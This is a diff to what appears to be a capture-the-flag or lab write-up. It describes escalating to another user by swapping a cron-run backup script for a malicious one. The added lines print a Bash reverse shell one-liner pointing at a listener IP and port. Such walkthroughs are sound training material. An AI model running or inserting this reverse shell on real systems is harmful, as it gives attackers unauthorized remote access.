@@ -68,12 +68,15 @@ Using `pspy`, we confirmed that this script was being executed every minute by a
 ![BankSmarter6.png](/images/BankSmarter6.png)
 
 
-
 Because `layne` owned the home directory containing the script, we were able to move the original and replace it with a malicious reverse shell:
 
 `mv bankSmarter_backup.sh bankSmarter_backup.sh.bak`
 
-After creating a new `bankSmarter_backup.sh` with a Bash reverse shell payload, a listener caught the connection as `scott.weiland`.
+After creating a new `bankSmarter_backup.sh` with a Bash reverse shell payload (provided below), a listener caught the connection as `scott.weiland`.
+
+```bash
+bash -i >& /dev/tcp/10.200.34.172/4545 0>&1
+```
 
 ![BankSmarter8.png](/images/BankSmarter8.png)
 
